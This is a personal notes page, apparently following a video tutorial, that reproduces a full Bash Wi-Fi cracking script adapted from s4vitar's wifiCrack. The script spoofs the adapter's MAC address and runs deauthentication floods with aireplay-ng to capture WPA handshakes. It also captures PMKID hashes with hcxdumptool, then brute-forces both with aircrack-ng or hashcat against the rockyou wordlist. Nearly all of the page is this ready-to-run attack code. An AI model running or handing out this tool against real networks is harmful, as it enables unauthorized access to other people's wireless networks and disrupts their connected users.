---
description: >-
  This is a tool written in Bash by s4vitar (wifiCrack). I've followed along his
  video tutorial, modified the tool to work with my wireless cards, translated
  it to english, will fork in the future.
---

# wip-W1nn13PwnWifi.sh

O[riginal video tutorial \(Spanish\)](%20https://www.youtube.com/watch?v=Mwt_RbdpJhk)

```text
#!/bin/bash

# Author: s4vitar - Bash scripting tutorial https://github.com/s4vitar/wifiCrack/blob/master/s4viPwnWifi.sh

#Colours avaialable to format text strings
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

# Usage of colours: String "\n optional line jump, ${green-gray+Colour} green-gray text ${endColour}"

export DEBIAN_FRONTEND=noninteractive # Allows for the unattended installation of dependencies components l.39

trap ctrl_c INT 

function ctrl_c(){ # when ctrl + c is pressed this function is ran, reverts the NIC to its normal state
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Closing...${endColour}"  
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Stopping Monitor mode on $networkCard {endColour}"
	tput cnorm; airmon-ng stop wlan0mon # if you wanted to redirect output to a "blackhole" uncomment: #> /dev/null 2>&1
	rm Captura* #2>/dev/null # ref line .22 # removes capture files
	exit 0 # exits without errors
}

function helpPanel(){ # the goal of this function is to assist the user with using the application
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Usage: ./W1nn13PwnWifi.sh${endColour}"
	# -e argument enables backslash escaping. backslash + n prompts a new line and + t inserts tab.  
	echo -e "\n\t${purpleColour}a)${endColour}${yellowColour} Attack Modes:${endColour}" 
	echo -e "\t\t${redColour}Handshake${endColour}"
	echo -e "\t\t${redColour}PKMID${endColour}"
	echo -e "\t${purpleColour}n)${endColour}${yellowColour} Nombre de la tarjeta de red${endColour}"
	echo -e "\t${purpleColour}h)${endColour}${yellowColour} Mostrar este panel de ayuda${endColour}\n"
	exit 0
}

function dependencies(){ #Validates that all required programs for the script to run are installed 
	# tput civis - toggle cursor blinker
	tput civis
	clear; dependencies=(aircrack-ng macchanger) # clears screen and defines a variable with tuple containing name of the required packages

	echo -e "${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...${endColour}"
	sleep 2

	for program in "${dependencies[@]}"; do
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Herramienta${endColour}${purpleColour} $program${endColour}${blueColour}...${endColour}"

		test -f /usr/bin/$program

		if [ "$(echo $?)" == "0" ]; then
			echo -e " ${greenColour}(V)${endColour}"
		else
			echo -e " ${redColour}(X)${endColour}\n"
			echo -e "${yellowColour}[*]${endColour}${grayColour} Instalando herramienta ${endColour}${blueColour}$program${endColour}${yellowColour}...${endColour}"
			apt-get install $program -y > /dev/null 2>&1
			apt-get install $program -y > /dev/null 2>&1 # instala iteracion del programa de la lista dependencies l.40 - cont
			# redirige el output del programa hacia el /dev/null/; Finalmente, convierte el stdErr en stdIn 2>&1 - de esta manera 
			#es visible si ocurre algun error
		fi; sleep 1
	done
}

function startAttack(){
				clear
				echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando tarjeta de red...${endColour}\n"
				airmon-ng start $networkCard > /dev/null 2>&1
				#ifconfig ${networkCard}mon down && macchanger -a ${networkCard}mon > /dev/null 2>&1
				ifconfig wlan0mon down && macchanger -a wlan0mon > /dev/nul 2>&1
				ifconfig wlan0mon up; killall dhclient wpa_supplicant 2>/dev/nul
				
				echo -e "${yellowColour}[*]${endColour}${grayColour} Nueva direccion MAC asignada ${endColour}${purpleColour}[${endColour}${blueColour}$(macchanger -s wlan0mon | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}${purpleColour}]${endColour}"

		if [ "$(echo $attack_mode)" == "Handshake" ]; then

			xterm -hold -e "airodump-ng wlan0mon" &
			airodump_xterm_PID=$!
			echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso: ${endColour}" && read apName
			echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Canal del punto de acceso: ${endColour}" && read apChannel

			kill -9 $airodump_xterm_PID
			wait $airodump_xterm_PID 2>/dev/null

			xterm -hold -e "airodump-ng -c $apChannel -w Captura --essid $apName wlan0mon" &
			airodump_filter_xterm_PID=$!

			sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $apName -c FF:FF:FF:FF:FF:FF wlan0mon" &
			aireplay_xterm_PID=$!
			sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

			sleep 10; kill -9 $airodump_filter_xterm_PID
			wait $airodump_filter_xterm_PID 2>/dev/null

			xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap" &
		elif [ "$(echo $attack_mode)" == "PKMID" ]; then
			clear; echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ClientLess PKMID Attack...${endColour}\n"
			sleep 2
			timeout 60 bash -c "hcxdumptool -i wlan0mon --enable_status=1 -o Captura"
			echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Obteniendo Hashes...${endColour}\n"
			sleep 2
			hcxpcaptool -z myHashes Captura; rm Captura 2>/dev/null

			test -f myHashes

			if [ "$(echo $?)" == "0" ]; then
				echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando proceso de fuerza bruta...${endColour}\n"
				sleep 2

				hashcat -m 16800 /usr/share/wordlists/rockyou.txt myHashes -d 1 --force
			else
				echo -e "\n${redColour}[!]${endColour}${grayColour} No se ha podido capturar el paquete necesario...${endColour}\n"
				rm Captura* 2>/dev/null
				sleep 2
			fi
		else
			echo -e "\n${redColour}[*] Este modo de ataque no es válido${endColour}\n"
		fi
}

# Main Function

if [ "$(id -u)" == "0" ]; then
	declare -i parameter_counter=0; while getopts ":a:n:h:" arg; do
		case $arg in
			a) attack_mode=$OPTARG ; let parameter_counter+=1;;
			n) networkCard=$OPTARG ; let parameter_counter+=1;;
			h) helpPanel;;
		esac
	done

	if [ $parameter_counter -ne 2 ]; then
		helpPanel
	else
		dependencies
		startAttack
		tput cnorm; airmon-ng stop wlan0mon > /dev/null 2>&1
	fi
else
	echo -e "\n${redColour}[*] No soy root${endColour}\n"
fi
```

